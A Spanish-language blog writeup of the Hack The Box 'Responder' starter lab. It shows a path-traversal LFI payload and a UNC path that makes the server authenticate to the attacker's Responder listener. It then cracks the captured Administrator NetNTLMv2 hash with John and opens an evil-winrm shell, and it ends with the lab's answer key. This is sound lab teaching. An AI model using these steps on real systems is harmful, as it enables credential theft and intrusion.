---
title: Hack The Box - Starting Point - Tier 1 - Responder Writeup
date: 2022-08-10 09:30:00 +0800
categories: ["Hack The Box"]
tags: [htb, writeups]     # TAG names should always be lowercase
---

Este post forma parte de la serie **Tier 1** del **Starting Point** de [HTB](https://app.hackthebox.com/starting-point) que iniciamos [aquí]({% post_url 2022-08-10-htb-writeup-tier1-appointment %}).

## Responder

El primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)

Copiamos la IP del equipo remoto, en mi caso *10.129.162.134*, y lanzamos un **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ nmap -A 10.129.162.134 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 19:45 CEST
Nmap scan report for 10.129.162.134
Host is up (0.042s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

Respondemos la pregunta de la primer task con un *1* y nos da error. Hay más puertos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ nmap -A -p- 10.129.162.134 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-10 19:48 CEST
Nmap scan report for 10.129.162.134
Host is up (0.041s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.08 seconds
```

Significado de las flags:

* `-p-`&nbsp;: para escanear los 65535 puertos.

Ahora si. Tenemos 2 puertos escuchando sobre un OS Windows.

Vamos a por el *80/tcp* desde el navegador por IP.

![](/assets/posts/20220810/img11.png)

No rula. Miramos el mensaje con atención. Toca modificar el fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">etc/hosts</code>&nbsp;&nbsp;de nuestro equipo para resolver la IP añadiendo la siguiente entrada.

```
10.129.162.134	unika.htb
```

Reintentamos.

![](/assets/posts/20220810/img12.png)

Trasteamos con el sitio: vemos código fuente, probamos el menú, cambiamos idioma ...

OK, aquí hay algo. La URL que se genera con cada cambio de idioma nos llama la atención:

```
http://unika.htb/index.php?page=french.html
http://unika.htb/index.php?page=german.html
```

Por qué ? porque el parámetro GET *page* podría darnos la posibilidad de explotar una vulnerabilidad de tipo **Local File Include (LFI)**.

Y qué es **LFI** ? En pocas palabras (googlear los que queráis profundizar):

* Imaginemos un par de páginas php con los nombres *a.php* y *b.php* con el siguiente código cada una:

```
# codigo de a.php
<?php
echo "Hola y ";
include 'b.php';
?>

#############################################
# codigo de b.php
<?php
echo "adios.";
?>
```

* La sentencia *include* en PHP permite *"incrustar"* el archivo que le pasemos como parámetro. En nuestro ejemplo, la página *a.php* incluirá el codigo de *b.php*. El resultado de cargar en un navegador la URL *https://unaweb.com/a.php* será:

```
Hola y adios.
```

* La sentencia *include* busca los archivos en base a la ruta que le demos como parámetro. En nuestro ejemplo, *a.php* y *b.php* estan en el mismo directorio, pero *b.php* podría estar en otra ubicación, por encima o por debajo de donde se encuentra *a.php*. 

```
# codigo de a.php modificado
<?php
echo "Hola y ";

# b.php esta un directorio por debajo respecto de a.php, en la carpeta saludos/
include 'saludos/b.php';

# c.php esta un directorio por encima de donde se encuentra a.php
include '../c.php';
?>
```

* Las rutas en este caso son relativas al directorio de *a.php*, pero podrían ser absolutas, apuntando a cualquier fichero del servidor.

* Hasta aquí hemos utilizado un valor establecido en código para el parámetro que pasamos a la sentencia *include* en *a.php*. Otra opción es tomarlo desde la URL, mediante un GET.

```
# codigo de a.php
<?php
echo "Hola y ";
include $_GET[‘pagina’];
?>

#############################################
# codigo de b.php
<?php
echo "adios.";
?>
```

* Ahora si cargamos la URL *https://unaweb.com/a.php?pagina=b.php* obtendremos el mismo resultado que antes.

* A todas luces ésta codificación resulta poco segura. Si el valor de *pagina* que pasamos en el GET apunta a un fichero que no existe, el sitio nos mostrará un *Warning* avisándonos de ello. Si el fichero existe, nos mostrará su contenido.

Probemos la teoría que acabamos de exponer e intentemos cargar la siguiente URL a ver qué pasa.

```
http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
```

Resultado:

![](/assets/posts/20220810/img13.png)

Bien. Vulnerabilidad LFI confirmada. Tenemos algo por donde avanzar. Y lo que vamos a intentar es capturar el hash NetNTLMv2 del administrador utilizando **responder**.

Veamos el proceso con un poco de detalle antes de seguir.

* Aprovechándonos de LFI vamos a pedirle al servidor que se conecte mediante el protocolo SMB a un recurso *'supuestamente'* disponible en nuestra máquina local.

* Ante esta petición, el Windows corriendo en el servidor intentará autenticarse en nuestra máquina local mediante el protocolo NTLM (New Technology Lan Manager), un protocolo de autenticación desafío-respuesta creado por Microsoft.

* El protocolo NTLM, para hacer la autenticación a través de la red mediante el modelo desafío-respuesta, creará una cadena específicamente formateada para incluir el desafío y la respuesta llamada NetNTLMv2. A menudo se denomina a esta cadena hash NetNTLMv2 porque la atacamos de la misma manera, si bien no es un hash como tal.

* Con **responder** vamos a intentar capturar este hash, probar a crakearlo con **John The Ripper** y ver luego en para qué podemos utilizarlo.

Vamos a ello.

Lo primero será iniciar **responder** poniéndolo a escuhar en la interfaz por la que estamos conectados con el server via VPN. Cuál esa interfaz ?

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ ifconfig
[...]
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.xx.xx  netmask 255.255.254.0  destination 10.10.xx.xx
        inet6 dead:beef:4::10d7  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::da05:xxxx:xxxx:xxxx  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 2542  bytes 2751464 (2.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 135726  bytes 8149968 (7.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

*tun0* es la interfaz, y *10.10.xx.xx* la IP con la que nos ve el servidor remoto.

Iniciamos **responder** como *root* con el flag ```-I```&nbsp; para indicarle la interfaz donde queremos que se ponga a escuchar.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.xx.xx]
    Responder IPv6             [dead:beef:4::10d7]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-UOOC6QT03DP]
    Responder Domain Name      [2HZ9.LOCAL]
    Responder DCE-RPC Port     [47770]

[+] Listening for events...
```

Volvemos al browser y cargamos la siguiente URL:

```
http://unika.htb/?page=//10.10.xx.xx/cualquiercosa
```

Con ésto estamos pasando al server la instrucción de acceder al recurso *"cualquiercosa"* disponible en un equipo remoto (el nuestro: 10.10.xx.xx) via SMB. Volvemos a nuestro terminal con el **responder**.

```console
[...]
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.162.134
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:391cb4aa715056c9:C54272D4464F74D5C235EBE63FEE4363:0101000000000000009189C3F4ACD8014A1261F7F5B969F60000000002000800320048005A00390001001E00570049004E002D0055004F004F004300360051005400300033004400500004003400570049004E002D0055004F004F00430036005100540030003300440050002E00320048005A0039002E004C004F00430041004C0003001400320048005A0039002E004C004F00430041004C0005001400320048005A0039002E004C004F00430041004C0007000800009189C3F4ACD801060004000200000008003000300000000000000001000000002000004494E98B22B4A0D90CF797477A506E49CDD8E2352837BD9668F0DB7C2947DDB50A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003200310037000000000000000000
```

Bingo ! ... **responder** ha capturado el hash enviado por Windows desde el server remoto (*[SMB] NTLMv2-SSP Client: 10.129.162.134*) a nuestro recurso local *//10.10.xx.xx/cualquiercosa* con el objetivo de autenticarse.

Turno de **john**. Copiamos el valor del Hash NTLMv2 a un fichero nuevo y guardamos. Utilizamos *rockyou.txt* como diccionario.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt responder.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2022-08-10 20:11) 50.00g/s 204800p/s 204800c/s 204800C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

OK. Hemos conseguido la password de *Administrator* a partir del hash capturado.

Qué hacemos con esto ? Si repasamos el volcado de **nmap** vemos que además del puerto *80/tcp* el servidor tiene abierto el *5985/tcp*.

Googleamos. Nos enteramos [aquí](https://www.speedguide.net/port.php?port=5985) que el puerto en cuestión esta asociado al servicio *<strong>winrm:</strong>*

> WinRM 2.0 (Microsoft Windows Remote Management) uses port 5985/tcp for HTTP and 5986/tcp for HTTPS by default.

Googleamos posibles formas de explotar este servicio. Damos con info interesante [aquí (parte 1)](https://thehackerway.com/2021/11/04/evil-winrm-shell-sobre-winrm-para-pentesting-en-sistemas-windows-parte-1-de-2/) y [aquí (parte 2)](https://thehackerway.com/2021/12/15/evil-winrm-shell-sobre-winrm-para-pentesting-en-sistemas-windows-parte-2-de-2/).

> **Nota:** los más ansiosos pueden recurrir [aquí](https://pentesting.mrw0l05zyn.cl/explotacion/servicios/5985-tcp-5986-tcp-winrm) directamente.

Bien, necesitamos tirar de **evil-winrm**. Si no lo tenemos, lo instalamos (está disponible en el repositorio de Kali).

**evil-winrm**, una vez conectado, nos va a proveer de una shell con la que podremos trastear por el server remoto en búsqueda de nuestra flag.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ evil-winrm -i 10.129.162.134 -u administrator -p badminton

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public

*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> dir

    Directory: C:\Users\mike

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop

*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> dir

    Directory: C:\Users\mike\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt

*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
*Evil-WinRM* PS C:\Users\mike\Desktop>
```

Conseguido.

## Respuestas:

* <strong>Task 1</strong>: 2
* <strong>Task 2</strong>: unika.htb
* <strong>Task 3</strong>: php
* <strong>Task 4</strong>: page
* <strong>Task 5</strong>: ../../../../../../../../windows/system32/drivers/etc/hosts
* <strong>Task 6</strong>: //10.10.14.6/somefile
* <strong>Task 7</strong>: New Technology Lan Manager
* <strong>Task 8</strong>: -I
* <strong>Task 9</strong>: John The Ripper
* <strong>Task 10</strong>: badminton
* <strong>Task 11</strong>: 5985

